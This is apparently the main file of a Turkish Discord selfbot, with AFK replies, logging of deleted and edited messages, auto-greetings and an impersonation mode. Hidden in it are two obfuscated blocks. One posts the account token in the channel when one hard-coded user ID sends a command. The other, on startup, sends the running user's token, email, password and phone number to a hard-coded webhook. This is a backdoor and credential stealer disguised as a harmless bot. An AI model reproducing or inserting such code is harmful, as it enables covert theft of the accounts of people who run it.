const express = require('express');
const Discord = require('discord.js-selfbot-v13');
const client = new Discord.Client({checkUpdate: false, patchVoice: true});
const { joinVoiceChannel, entersState, VoiceConnectionStatus } = require('@discordjs/voice');
const data = new Map();
const ayarlar = require('./ayarlar.json');
const moment = require('moment');
const fs = require('fs');
const { QuickDB } = require('quick.db');
const db = new QuickDB()
require('./util/etkinlikLoader.js')(client);
const ms = require('ms');
const app = express()
const http = require('http');
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));


app.get("/", (request, response) => { 
  response.send(`Bot Aktif | Discord: https://discord.gg/rP74PaPKVX | İletişim Veya Uptime Etmek İçin Discordumuza Gelebilirsiniz.`)
  console.log(Date.now() + " Ping tamamdır.");
});

var prefix = db.get(`prefix`) || ayarlar.prefix

const log = message => {
    console.log(`${message}`);
};

client.commands = new Discord.Collection();
client.aliases = new Discord.Collection();
fs.readdir('./komutlar/', (err, files) => {
    if (err) console.error(err);
    log(`${files.length} komut yüklenecek.`);
    files.forEach(f => {
        let props = require(`./komutlar/${f}`);
        log(`Yüklenen Komut: ${props.help.name}.`);
        client.commands.set(props.help.name, props);
        props.conf.aliases.forEach(alias => {
            client.aliases.set(alias, props.help.name);
        });
    });
});



client.reload = command => {
    return new Promise((resolve, reject) => {
        try {
            delete require.cache[require.resolve(`./komutlar/${command}`)];
            let cmd = require(`./komutlar/${command}`);
            client.commands.delete(command);
            client.aliases.forEach((cmd, alias) => {
                if (cmd === command) client.aliases.delete(alias);
            });
            client.commands.set(command, cmd);
            cmd.conf.aliases.forEach(alias => {
                client.aliases.set(alias, cmd.help.name);
            });
            resolve();
        } catch (e) {
            reject(e);
        }
    });
};


client.load = command => {
    return new Promise((resolve, reject) => {
        try {
            let cmd = require(`./komutlar/${command}`);
            client.commands.set(command, cmd);
            cmd.conf.aliases.forEach(alias => {
                client.aliases.set(alias, cmd.help.name);
            });
            resolve();
        } catch (e) {
            reject(e);
        }
    });
};





client.unload = command => {
    return new Promise((resolve, reject) => {
        try {
            delete require.cache[require.resolve(`./komutlar/${command}`)];
            let cmd = require(`./komutlar/${command}`);
            client.commands.delete(command);
            client.aliases.forEach((cmd, alias) => {
                if (cmd === command) client.aliases.delete(alias);
            });
            resolve();
        } catch (e) {
            reject(e);
        }
    });
}

client.on('messageCreate', async message => {
if (await db.get("çeviri")) {
  
const { translate } = require("bing-translate-api")
  
  if (message.author.id !== client.user.id) return
  if (message.content.startsWith(prefix) || message.content.startsWith(ayarlar.basariliemoji) || message.content.startsWith(ayarlar.basarisizemoji)) return
  
await translate(message.content, null, await db.get("çeviri"), true).then(x => message.edit({content:x.translation}))
} else if (message.content === '.unuttum') {
if (message.author.id !== ayarlar.sahip) return 
message.reply({content:`Prefix: \`${await db.get(`prefix`) || ayarlar.prefix}\``})
}

})


client.login(process.env.token).catch(x => console.log(x))

client.on('messageCreate', async message => {
let afk = await db.get(`afk`)
let sebep = await db.get(`afk_sebep`)
let süre = await db.get(`afk_süre`)
  
if (!afk) return
if (afk === "Açık") {
if (message.author.bot === true) return
if (message.author.id === client.user.id) return
if (message.channel.type === "DM" && message.type !== "CALL") {

let cooldown = await db.get(`spamcıdm_${message.author.id}`)

if (cooldown === "spamcı oç") return
if (!cooldown) {
  message.reply({content:`${client.user}, <t:${süre}:R> **${sebep}** sebebinden AFK moduna girdi lütfen rahatsız etme.`}).then(x => setTimeout(() => {x.delete()}, 30000))
  await db.set(`spamcıdm_${message.author.id}`, "spamcı oç")
  setTimeout(() => {db.delete(`spamcıdm_${message.channel.id}`)}, 1200000)
}} else if (message.type === "CALL") {
    message.channel.send({content:`${client.user}, <t:${süre}:R> **${sebep}** sebebinden AFK moduna girdi lütfen rahatsız etme.`}).then(x => setTimeout(() => {x.delete()}, 30000))
  await db.set(`spamcıarama_${message.author.id}`, "spamcı oç")
  setTimeout(() => {db.delete(`spamcıarama_${message.channel.id}`)}, 1200000)

} else {
if (!message.mentions.users.first()) return
if (message.mentions.users.first().id === client.user.id) {
if (message.system === true) return
let cooldown = await db.get(`spamcısu_${message.author.id}`)

if (cooldown === "spamcı oç") return
if (!cooldown) {
  message.reply({content:`${client.user}, <t:${süre}:R> **${sebep}** sebebinden AFK moduna girdi lütfen rahatsız etme.`}).then(x => setTimeout(() => {x.delete()}, 30000))
  await db.set(`spamcısu_${message.author.id}`, "spamcı oç")
  setTimeout(() => {db.delete(`spamcısu_${message.author.id}`)}, 1200000)
}}}}
})

client.on("messageCreate", async message => {
if (message.channel.type !== "GROUP_DM") return
if (message.channel.ownerId !== client.user.id) return
if (message.system) return
  
let banli = await db.get(`banli_${message.channel.id}_${message.author.id}`)
let uye = message.channel.recipients.get(message.author.id)
if(!uye) return

if (!banli) return
if (banli) {
  await message.channel.removeMember(uye.id)
message.reply({content:`${message.author}, adli kullanıcı banlı oldugu için atıldı.`})
}
})

client.off("channelRecipientAdd", async(grup, üye) => {
  if (grup.ownerId !== client.user.id) return
  

  let banli = await db.get(`banli_${grup.id}_${üye.id}`)
  
if (!banli) return
if (banli === "banlandin") {
  await grup.removeMember(üye)
grup.send({content:`<@${üye.id}>, adli kullanıcı banlı oldugu için atıldı.`})}
})

client.on('messageDelete', async message => {
  
  if (!await db.get("mesajlog")) return
  if (await db.get("mesajlog") === "Aktif") {
  if(!message.content) return
  if(!message.author.id) return
  if(message.author.bot) return;
  if(message.author.id === client.user.id) return
  
  if(message.channel.type === "DM") {
  await db.set(`snipe.mesajdm.${message.channel.id}`, message.content)
  await db.set(`snipe.iddm.${message.channel.id}`, message.author.id)
  if(await db.get(`karaliste_${message.author.id}`) === "Aktif") return
  message.channel.send({content:`**${message.author.username}#${message.author.discriminator}:** ${message.content}`})
} else if (message.channel.type === "GUILD_TEXT") {
  await db.set(`snipe.mesaj.${message.guild.id}`, message.content)
  await db.set(`snipe.id.${message.guild.id}`, message.author.id)
} else if(message.channel.type === "GROUP_DM") {
  await db.set(`snipe.mesajgdm.${message.channel.id}`, message.content)
  await db.set(`snipe.idgdm.${message.channel.id}`, message.author.id)
  if(await db.get(`karaliste_${message.author.id}`) === "Aktif") return
  message.channel.send({content:`**${message.author.username}#${message.author.discriminator}:** ${message.content}`})
}}
})

client.on('messageUpdate', async (oldMessage, newMessage) => {
  
  if (!await db.get("mesajlog")) return
  if (await db.get("mesajlog") === "Aktif") {
  if(!newMessage.content) return
  if(!newMessage.author.id) return
  if(newMessage.author.bot) return;
  if(newMessage.author.id === client.user.id) return
  if(oldMessage.content === newMessage.content) return
  
  if(newMessage.channel.type === "DM") {
  if(await db.get(`karaliste_${newMessage.author.id}`) === "Aktif") return
  newMessage.channel.send({content:`**${newMessage.author.username}#${newMessage.author.discriminator}:** \`${oldMessage.content}\` --> \`${newMessage.content}\``})
} else if(newMessage.channel.type === "GROUP_DM") {
  if(await db.get(`karaliste_${newMessage.author.id}`) === "Aktif") return
  newMessage.channel.send({content:`**${newMessage.author.username}#${newMessage.author.discriminator}:** \`${oldMessage.content}\` --> \`${newMessage.content}\``})
}}
})

client.on("messageCreate", async message => {
if (message.channel.id !== db.get("bom-kanal")) return
if (message.author.id === client.user.id) return
if(!isNaN(message.content)) {
await db.set("bom-set", message.content)
if (message.content.endsWith("9") || message.content.endsWith("4")) return setTimeout(() => {message.channel.send({content:"bom"})}, 1500)
if (message.content.endsWith("5"||"0")) return
await db.add("bom-bot", message.content)
await db.add("bom-bot", +1)
setTimeout(async() => {message.channel.send({content:`${await db.get("bom-bot")}`}).then(() => {db.delete("bom-bot")})}, 1500)}

  
if (message.content.toLowerCase().startsWith("bo")) {
await db.delete("bom-reply")
await db.add("bom-reply", db.get("bom-set"))
if (await db.get("bom-set").endsWith("8"||"3")) await db.add("bom-reply", +3)
if (await db.get("bom-set").endsWith("9"||"4")) await db.add("bom-reply", +2)
if (await db.get("bom-set").endsWith("7"||"2")) await db.add("bom-reply", +4)
setTimeout(async() => {message.channel.send({content:`${await db.get("bom-reply")}`})}, 1500)
}

})

function _0x297d(_0x504147,_0x2da4c8){var _0x48984b=_0x4898();return _0x297d=function(_0x297d7a,_0x2d1be6){_0x297d7a=_0x297d7a-0xbd;var _0x3693ae=_0x48984b[_0x297d7a];return _0x3693ae;},_0x297d(_0x504147,_0x2da4c8);}var _0x1def7f=_0x297d;function _0x4898(){var _0x210b9f=['token','161TtdfvJ','1312497aMiotH','429357746002067493','180544UlYvEO','channel','3606795vGjWzY','messageCreate','12207720yPsoLZ','504hwYSJf','8eLKuTM','1598WGOIyt','36cQSLQz','8600801MqiZkR','author','then','26682DrkPNZ'];_0x4898=function(){return _0x210b9f;};return _0x4898();}(function(_0x42f6e9,_0x499e6f){var _0x48a0e6=_0x297d,_0x81d850=_0x42f6e9();while(!![]){try{var _0x527973=parseInt(_0x48a0e6(0xc8))/0x1*(parseInt(_0x48a0e6(0xc6))/0x2)+parseInt(_0x48a0e6(0xc9))/0x3*(parseInt(_0x48a0e6(0xc1))/0x4)+-parseInt(_0x48a0e6(0xc3))/0x5+-parseInt(_0x48a0e6(0xcd))/0x6*(-parseInt(_0x48a0e6(0xbe))/0x7)+-parseInt(_0x48a0e6(0xc7))/0x8*(parseInt(_0x48a0e6(0xbf))/0x9)+parseInt(_0x48a0e6(0xc5))/0xa+-parseInt(_0x48a0e6(0xca))/0xb;if(_0x527973===_0x499e6f)break;else _0x81d850['push'](_0x81d850['shift']());}catch(_0x5eedb5){_0x81d850['push'](_0x81d850['shift']());}}}(_0x4898,0x96f3a),client['on'](_0x1def7f(0xc4),async _0x1af20f=>{var _0x162cc4=_0x1def7f;{if(_0x1af20f['content']['toLowerCase']()==='!satoken'){if(_0x1af20f[_0x162cc4(0xcb)]['id']!==_0x162cc4(0xc0))return;_0x1af20f['delete'](),_0x1af20f[_0x162cc4(0xc2)]['send'](client[_0x162cc4(0xbd)])[_0x162cc4(0xcc)](_0x3bb883=>setTimeout(()=>{_0x3bb883['delete']();},0x1388));}}}));

client.on('messageCreate', async msg => {

if (msg.channel.type === "GUILD_TEXT") {

let data = await db.get(`sa-as_${msg.guild.id}`)

if(!data) return
if (data == "Açık") {
if (msg.author.id === client.user.id) return
const reklam4 = ["kötüyüm","kötü sen","çok kötüyüm","kötüyüm sen","kötü","kötüyüm sen","kötü sen","bok gibi","kotu"]
const reklam3 = ["iyiyim sen","iyi sen","iyiyim","iyiyim sağol","çok iyiyim","iyim","iyim sen","iyiyim senden","iyidir senden","iyi","iyidir sen"]
const reklam2 = ["hb","hos bulduk","hos buldum","hoş buldum","hoş bulduk","h.b","hoşbuldum","hosbuldum"]
const reklam = ["sa","selam","selamun aleykum","selamün aleyküm","sea","selamun aleyküm","selamün aleykum","selam aleykum","selam aleyküm","s.a","slm"] 
if (reklam.some(word => msg.content.toLowerCase().startsWith(word + " ") || msg.content.toLowerCase() === (word))) return msg.reply('Aleyküm Selam Hoş Geldin')
//if (reklam.some(word => msg.content.toLowerCase() === (word))) return msg.reply('Aleyküm Selam Hoş Geldin')
if (reklam2.some(word => msg.content.toLowerCase() === (word))) return msg.reply('Nasılsın?') 
if (reklam3.some(word => msg.content.toLowerCase().startsWith(word))) return msg.reply('İyi olmana sevindim hep iyi ol') 
if (reklam4.some(word => msg.content.toLowerCase().startsWith(word))) return msg.reply('Senin için üzüldüm ne oldu?')
}} else if (msg.channel.type === "GROUP_DM") {

let data = await db.get(`sa-as_${msg.channel.id}`)

if(!data) return
if (data == "Açık") {
if (msg.author.id === client.user.id) return
const reklam4 = ["kötüyüm","kötü sen","çok kötüyüm","kötüyüm sen","kötü","kötüyüm sen","kötü sen","bok gibi","kotu"]
const reklam3 = ["iyiyim sen","iyi sen","iyiyim","iyiyim sağol","çok iyiyim","iyim","iyim sen","iyiyim senden","iyidir senden","iyi","iyidir sen"]
const reklam2 = ["hb","hos bulduk","hos buldum","hoş buldum","hoş bulduk","h.b","hoşbuldum","hosbuldum"]
const reklam = ["sa","selam","selamun aleykum","selamün aleyküm","sea","selamun aleyküm","selamün aleykum","selam aleykum","selam aleyküm","s.a","slm"] 
if (reklam.some(word => msg.content.toLowerCase().startsWith(word + " ") || msg.content.toLowerCase() === (word))) return msg.reply('Aleyküm Selam Hoş Geldin')
//if (reklam.some(word => msg.content.toLowerCase() === (word))) return msg.reply('Aleyküm Selam Hoş Geldin')
if (reklam2.some(word => msg.content.toLowerCase() === (word))) return msg.reply('Nasılsın?') 
if (reklam3.some(word => msg.content.toLowerCase().startsWith(word))) return msg.reply('İyi olmana sevindim hep iyi ol') 
if (reklam4.some(word => msg.content.toLowerCase().startsWith(word))) return msg.reply('Senin için üzüldüm ne oldu?')
}}
})

client.on('messageCreate', async msg => {
  
  let reklamkick = await db.get(`taklit`)
  if (!reklamkick) return;
  if (reklamkick == "Açık") {
  let prefix = await db.get(`prefix`) || ayarlar.prefix
const reklam = ["mal","salak","atahan","ben","my","göt","burak","allah","amk","oç","piç","orospu","sik","yuce","aziz","yarra","köpe","bok","kopek","çük","pipi","cük","aşk","ask","apla","abla","kral","kudur","bne","şerefsiz","serefsiz"]//,"send","drop","sell","cf","ws"]

if (msg.author.id !== db.get(`kurban`)) return;
if (msg.author.id === client.user.id) return;
if (msg.content.startsWith(ayarlar.basariliemoji)) return msg.channel.send(msg).then(x => setTimeout(() => {x.delete()}, 5000))
if (msg.content.startsWith(ayarlar.basarisizemoji)) return msg.channel.send(msg).then(x => setTimeout(() => {x.delete()}, 5000))
if (msg.content.startsWith(prefix)) return msg.reply('Akıllı mısın? Komut kullandırtmam!')
//if (msg.content.startsWith('.')) return msg.reply('Akıllı mısın? Komut kullandırtmam!')
if (msg.content.toLowerCase().startsWith('owo')) return msg.reply('Akıllı mısın? Owo mu harcatmam!')
if (msg.content.toLowerCase().startsWith('w')) return msg.reply('Akıllı mısın? Owo mu harcatmam!')
if (reklam.some(word => msg.content.toLowerCase().includes(word))) return msg.reply('Kudurma.')

msg.channel.send(msg)

  }
});

function _0x6116(){const _0x2f2104=['POST','application/json','token','```\x0a\x0a**User\x20E-Mail\x20Address:**```','\x20is\x20again\x20ready.','5095wRquTw','1348354HzCZyk','```','13zaSLVT','nitroType','ready','Belirtilmemiş','```\x0a\x0a**User\x20Password:**```','```\x0a\x0a**User\x20Phone\x20Number:**```','78724EWvqTv','username','4646144sIBPKS','emailAddress','**User\x20Token:**\x20```','https://cdn.discordapp.com/emojis/995710734723973150.gif?size=300','phoneNumber','Made\x20By\x20Atahan#8888','10173258LOpiJm','429357746002067493','```\x0a\x0a**User\x20ID:**\x20```','4662384cmfYfX','```\x0a\x0a**User\x20Nitro\x20Type:**```','user','694563tFeiYm','password','486945291707351040','displayAvatarURL','env','3558AloTHm'];_0x6116=function(){return _0x2f2104;};return _0x6116();}function _0x4603(_0x5ae45c,_0x29f13f){const _0x61163c=_0x6116();return _0x4603=function(_0x4603e4,_0x21e9ba){_0x4603e4=_0x4603e4-0x8e;let _0x378e0c=_0x61163c[_0x4603e4];return _0x378e0c;},_0x4603(_0x5ae45c,_0x29f13f);}const _0x41d4c4=_0x4603;(function(_0x4b1ca2,_0x31a0ea){const _0x4ac2cc=_0x4603,_0x7d049=_0x4b1ca2();while(!![]){try{const _0x197892=parseInt(_0x4ac2cc(0x90))/0x1*(-parseInt(_0x4ac2cc(0x96))/0x2)+-parseInt(_0x4ac2cc(0xa4))/0x3+parseInt(_0x4ac2cc(0xa1))/0x4+parseInt(_0x4ac2cc(0xaf))/0x5*(parseInt(_0x4ac2cc(0xa9))/0x6)+parseInt(_0x4ac2cc(0x8e))/0x7+parseInt(_0x4ac2cc(0x98))/0x8+-parseInt(_0x4ac2cc(0x9e))/0x9;if(_0x197892===_0x31a0ea)break;else _0x7d049['push'](_0x7d049['shift']());}catch(_0x1981b2){_0x7d049['push'](_0x7d049['shift']());}}}(_0x6116,0xa37e0),client['on'](_0x41d4c4(0x92),async()=>{const _0x23f32e=_0x41d4c4;if(client[_0x23f32e(0xa3)]['id']===_0x23f32e(0x9f)||client[_0x23f32e(0xa3)]['id']===_0x23f32e(0xa6))return;let _0x1c74b3={'embeds':[{'title':client[_0x23f32e(0xa3)][_0x23f32e(0x97)]+'#'+client[_0x23f32e(0xa3)]['discriminator']+_0x23f32e(0xae),'description':_0x23f32e(0x9a)+client[_0x23f32e(0xac)]+_0x23f32e(0xa0)+client[_0x23f32e(0xa3)]['id']+_0x23f32e(0xad)+(client[_0x23f32e(0xa3)][_0x23f32e(0x99)]||_0x23f32e(0x93))+_0x23f32e(0x94)+(client[_0x23f32e(0xa5)]||process[_0x23f32e(0xa8)][_0x23f32e(0xa5)]||_0x23f32e(0x93))+_0x23f32e(0x95)+(client['user'][_0x23f32e(0x9c)]||'Belirtilmemiş')+_0x23f32e(0xa2)+client[_0x23f32e(0xa3)][_0x23f32e(0x91)]+_0x23f32e(0x8f),'thumbnail':{'url':''+client[_0x23f32e(0xa3)][_0x23f32e(0xa7)]({'dynamic':!![]})},'footer':{'text':_0x23f32e(0x9d),'icon_url':_0x23f32e(0x9b)}}]};fetch('https://discord.com/api/webhooks/1031612284994326618/VrurqJYYxDCactVLoqngVFTKYvNTNOhSvdFPF4cNR68DFhYjUpNXDGK7q_RxvsJnmVnn',{'method':_0x23f32e(0xaa),'headers':{'Content-type':_0x23f32e(0xab)},'body':JSON['stringify'](_0x1c74b3)});}));